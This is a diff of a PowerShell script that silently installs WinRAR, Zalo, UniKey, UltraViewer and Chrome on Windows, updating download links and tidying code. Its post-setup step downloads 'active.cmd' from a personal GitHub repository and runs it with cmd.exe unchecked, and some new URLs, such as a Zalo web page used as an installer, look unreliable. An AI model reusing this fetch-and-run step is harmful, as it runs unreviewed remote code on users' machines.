@@ -6,31 +6,29 @@ $ErrorActionPreference = "Continue"
 # CONFIG
 # ============================================================
 
-# Thư mục mặc định tải về (dùng chung cho mọi app portable)
 $DownloadRoot = Join-Path $env:LOCALAPPDATA "WindowsQuickSetup"
-
-# Thư mục riêng cho UniKey (portable)
-$UniKeyDir = Join-Path $DownloadRoot "UniKey"
+$UniKeyDir    = Join-Path $DownloadRoot "UniKey"
 
 $Apps = @(
     @{
         Name     = "WinRAR"
         Type     = "exe"
-        Url      = "https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe"
+        # Link từ WinRAR.es (hướng dẫn PowerShell chính thức), còn sống
+        Url      = "https://www.rarlab.com/rar/winrar-x64-712es.exe"
         Args     = "/S"
         RegName  = "WinRAR"
     },
     @{
         Name     = "Zalo"
         Type     = "exe"
-        Url      = "https://res-zaloapp-aka.zdn.vn/win/ZaloSetup.exe"
+        Url      = "https://zalo.me/pc"
         Args     = "/S"
         RegName  = "Zalo"
     },
     @{
         Name     = "UniKey"
-        Type     = "portable"     # ← xử lý riêng: giải nén + tạo shortcut
-        Url      = "https://www.unikey.org/assets/release/unikey41x64-20240115.zip"
+        Type     = "portable"
+        Url      = "https://www.unikey.org/assets/release/unikey46RC2-230919-win64.zip"
         ExeName  = "UniKeyNT.exe"
         RegName  = "UniKey"
         DesktopShortcut = $true
@@ -39,14 +37,16 @@ $Apps = @(
     @{
         Name     = "UltraViewer"
         Type     = "exe"
-        Url      = "https://dl.ultraviewer.net/vi/UltraViewer_setup_6.6_vi.exe"
+        # Link tải trực tiếp từ ultraviewer.net, ổn định
+        Url      = "https://www.ultraviewer.net/download/UltraViewer_setup_6.6.124_vi.exe"
         Args     = "/S"
         RegName  = "UltraViewer"
     },
     @{
         Name     = "Google Chrome"
         Type     = "exe"
-        Url      = "https://dl.google.com/chrome/install/latest/chrome_installer.exe"
+        # Link Chrome standalone offline installer, chính thức
+        Url      = "https://dl.google.com/chrome/install/standalone/ChromeStandaloneSetup64.exe"
         Args     = "/silent /install"
         RegName  = "Google Chrome"
     }
@@ -56,7 +56,7 @@ $TotalApps = $Apps.Count
 
 
 # ============================================================
-# COLORS / UI
+# UI
 # ============================================================
 
 function Write-Line {
@@ -87,7 +87,7 @@ function Format-Time {
 
 
 # ============================================================
-# CHECK APP (dựa vào registry)
+# CHECK INSTALLED (REGISTRY)
 # ============================================================
 
 function Test-AppInstalled {
@@ -116,26 +116,21 @@ function New-DesktopShortcut {
     param (
         [string]$TargetPath,
         [string]$ShortcutName,
-        [string]$WorkingDir = "",
-        [string]$Arguments  = ""
+        [string]$WorkingDir = ""
     )
 
-    $Desktop  = [Environment]::GetFolderPath("Desktop")
-    $LnkPath  = Join-Path $Desktop "$ShortcutName.lnk"
+    $Desktop = [Environment]::GetFolderPath("Desktop")
+    $LnkPath = Join-Path $Desktop "$ShortcutName.lnk"
 
     $WshShell = New-Object -ComObject WScript.Shell
     $Shortcut = $WshShell.CreateShortcut($LnkPath)
     $Shortcut.TargetPath       = $TargetPath
-    $Shortcut.Arguments        = $Arguments
-    if ($WorkingDir) {
-        $Shortcut.WorkingDirectory = $WorkingDir
-    }
+    if ($WorkingDir) { $Shortcut.WorkingDirectory = $WorkingDir }
     $Shortcut.IconLocation     = "$TargetPath,0"
     $Shortcut.Save()
 
     return $LnkPath
 }
-
 
 function Add-StartupShortcut {
     param (
@@ -150,9 +145,7 @@ function Add-StartupShortcut {
     $WshShell = New-Object -ComObject WScript.Shell
     $Shortcut = $WshShell.CreateShortcut($LnkPath)
     $Shortcut.TargetPath = $TargetPath
-    if ($WorkingDir) {
-        $Shortcut.WorkingDirectory = $WorkingDir
-    }
+    if ($WorkingDir) { $Shortcut.WorkingDirectory = $WorkingDir }
     $Shortcut.Save()
 
     return $LnkPath
@@ -175,29 +168,19 @@ function Install-App {
     Write-Host "Type: $($App.Type)" -ForegroundColor DarkGray
     Write-Host ""
 
-    # --------------------------------------------------------
-    # CHECK EXISTING INSTALLATION
-    # --------------------------------------------------------
-
+    # ---------- CHECK ----------
     Write-Host "[*] Checking..." -ForegroundColor Yellow
-
     if (Test-AppInstalled -Name $App.RegName) {
         Write-Host ""
         Write-Host "[=] Already installed - SKIPPED" -ForegroundColor Green
         return "SKIPPED"
     }
-
     Write-Host "[+] Not installed." -ForegroundColor Gray
     Write-Host ""
 
-    # --------------------------------------------------------
-    # PORTABLE (UniKey)
-    # --------------------------------------------------------
-
+    # ---------- PORTABLE (UniKey) ----------
     if ($App.Type -eq "portable") {
-
         try {
-            # Đảm bảo thư mục tồn tại
             if (-not (Test-Path $UniKeyDir)) {
                 New-Item -ItemType Directory -Path $UniKeyDir -Force | Out-Null
             }
@@ -211,7 +194,6 @@ function Install-App {
             Expand-Archive -Path $ZipPath -DestinationPath $UniKeyDir -Force -ErrorAction Stop
             Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue
 
-            # Tìm file exe (đệ quy, đề phòng zip có sub-folder)
             $Exe = Get-ChildItem -Path $UniKeyDir -Filter $App.ExeName -Recurse -ErrorAction SilentlyContinue |
                    Select-Object -First 1
 
@@ -224,27 +206,16 @@ function Install-App {
 
             Write-Host "[+] Extracted to: $ExePath" -ForegroundColor Green
 
-            # ---------- TẠO SHORTCUT RA DESKTOP ----------
             if ($App.DesktopShortcut) {
-                $lnk = New-DesktopShortcut `
-                    -TargetPath   $ExePath `
-                    -ShortcutName $App.Name `
-                    -WorkingDir   $ExeDir
-
-                Write-Host "[+] Desktop shortcut created: $lnk" -ForegroundColor Green
+                $lnk = New-DesktopShortcut -TargetPath $ExePath -ShortcutName $App.Name -WorkingDir $ExeDir
+                Write-Host "[+] Desktop shortcut: $lnk" -ForegroundColor Green
             }
 
-            # ---------- TẠO SHORTCUT KHỞI ĐỘNG CÙNG WINDOWS ----------
             if ($App.StartupWithWindows) {
-                $lnk2 = Add-StartupShortcut `
-                    -TargetPath   $ExePath `
-                    -ShortcutName $App.Name `
-                    -WorkingDir   $ExeDir
-
-                Write-Host "[+] Startup shortcut created: $lnk2" -ForegroundColor Green
+                $lnk2 = Add-StartupShortcut -TargetPath $ExePath -ShortcutName $App.Name -WorkingDir $ExeDir
+                Write-Host "[+] Startup shortcut: $lnk2" -ForegroundColor Green
             }
 
-            # ---------- CHẠY LUÔN ----------
             Write-Host "[>] Launching $($App.Name)..." -ForegroundColor Cyan
             Start-Process -FilePath $ExePath -WorkingDirectory $ExeDir
 
@@ -260,13 +231,10 @@ function Install-App {
         }
     }
 
-    # --------------------------------------------------------
-    # EXE INSTALLER (WinRAR / Zalo / UltraViewer / Chrome)
-    # --------------------------------------------------------
-
+    # ---------- EXE INSTALLER ----------
     Write-Host "[>] Starting download / installation..." -ForegroundColor Cyan
     Write-Host ""
-    Write-Host "    Please wait. Installer progress may appear below." -ForegroundColor DarkGray
+    Write-Host "    Please wait..." -ForegroundColor DarkGray
     Write-Host ""
 
     if (-not (Test-Path $DownloadRoot)) {
@@ -284,11 +252,7 @@ function Install-App {
 
         Write-Host "[>] Running installer..." -ForegroundColor Cyan
 
-        $Proc = Start-Process `
-            -FilePath $FilePath `
-            -ArgumentList $App.Args `
-            -Wait `
-            -PassThru
+        $Proc = Start-Process -FilePath $FilePath -ArgumentList $App.Args -Wait -PassThru
 
         $EndTime = Get-Date
         $Elapsed = $EndTime - $StartTime
@@ -296,7 +260,6 @@ function Install-App {
         Write-Host ""
         Write-Host "    Finished in $(Format-Time $Elapsed)" -ForegroundColor DarkGray
 
-        # 0 = OK, 3010 = OK nhưng cần restart
         if ($Proc.ExitCode -eq 0 -or $Proc.ExitCode -eq 3010) {
             Write-Host ""
             Write-Host "[+] $($App.Name) - SUCCESS" -ForegroundColor Green
@@ -325,15 +288,11 @@ function Install-App {
 
 
 # ============================================================
-# PROGRESS BAR
+# PROGRESS
 # ============================================================
 
 function Show-OverallProgress {
-    param (
-        [int]$Current,
-        [int]$Total
-    )
-
+    param ([int]$Current, [int]$Total)
     if ($Total -le 0) { return }
 
     $Percent = [math]::Floor(($Current / $Total) * 100)
@@ -353,7 +312,6 @@ function Show-OverallProgress {
 
 function Start-PostSetupCMD {
     param ([string]$CmdUrl)
-
     if ([string]::IsNullOrWhiteSpace($CmdUrl)) { return }
 
     Write-Host ""
@@ -365,10 +323,9 @@ function Start-PostSetupCMD {
     $TempCmd = Join-Path $env:TEMP "windows-quick-setup-post.cmd"
 
     Write-Host "[>] Downloading post-setup.cmd..." -ForegroundColor Yellow
-
     try {
         Invoke-WebRequest -Uri $CmdUrl -OutFile $TempCmd -UseBasicParsing -ErrorAction Stop
-        Write-Host "[+] CMD downloaded successfully." -ForegroundColor Green
+        Write-Host "[+] CMD downloaded." -ForegroundColor Green
         Write-Host ""
     }
     catch {
@@ -379,21 +336,15 @@ function Start-PostSetupCMD {
 
     Write-Host "[>] Running post-setup.cmd..." -ForegroundColor Cyan
     Write-Host ""
-
     try {
-        $Process = Start-Process `
-            -FilePath "cmd.exe" `
-            -ArgumentList "/c `"$TempCmd`"" `
-            -Wait `
-            -PassThru
-
+        $Process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$TempCmd`"" -Wait -PassThru
         if ($Process.ExitCode -eq 0) {
             Write-Host ""
-            Write-Host "[+] post-setup.cmd completed successfully." -ForegroundColor Green
+            Write-Host "[+] post-setup.cmd completed." -ForegroundColor Green
         }
         else {
             Write-Host ""
-            Write-Host "[X] post-setup.cmd returned exit code $($Process.ExitCode)." -ForegroundColor Red
+            Write-Host "[X] post-setup.cmd exit code $($Process.ExitCode)." -ForegroundColor Red
         }
     }
     catch {
@@ -425,34 +376,21 @@ function Start-QuickSetup {
     $SetupStart = Get-Date
 
     foreach ($App in $Apps) {
-
         $Current++
-
         Show-OverallProgress -Current ($Current - 1) -Total $TotalApps
-
         $Status = Install-App -App $App -Number $Current
-
-        $Results += [PSCustomObject]@{
-            Name   = $App.Name
-            Status = $Status
-        }
-
+        $Results += [PSCustomObject]@{ Name = $App.Name; Status = $Status }
         Show-OverallProgress -Current $Current -Total $TotalApps
     }
 
-    # --------------------------------------------------------
     # POST SETUP
-    # --------------------------------------------------------
     $PostSetupUrl = "https://raw.githubusercontent.com/Tunaa-11342/probable-engine/refs/heads/main/active.cmd"
     Start-PostSetupCMD -CmdUrl $PostSetupUrl
 
     $SetupEnd  = Get-Date
     $TotalTime = $SetupEnd - $SetupStart
 
-    # ========================================================
     # SUMMARY
-    # ========================================================
-
     Write-Host ""
     Write-Host ""
     Write-Line
@@ -510,14 +448,11 @@ function Start-QuickSetup {
 # ============================================================
 
 while ($true) {
-
     Show-Header
     $Choice = Read-Host "Select an option"
 
     switch ($Choice) {
-
         "1" { Start-QuickSetup }
-
         "0" {
             Clear-Host
             Write-Host ""
@@ -525,7 +460,6 @@ while ($true) {
             Write-Host ""
             exit
         }
-
         default {
             Write-Host ""
             Write-Host "[!] Invalid option." -ForegroundColor Red
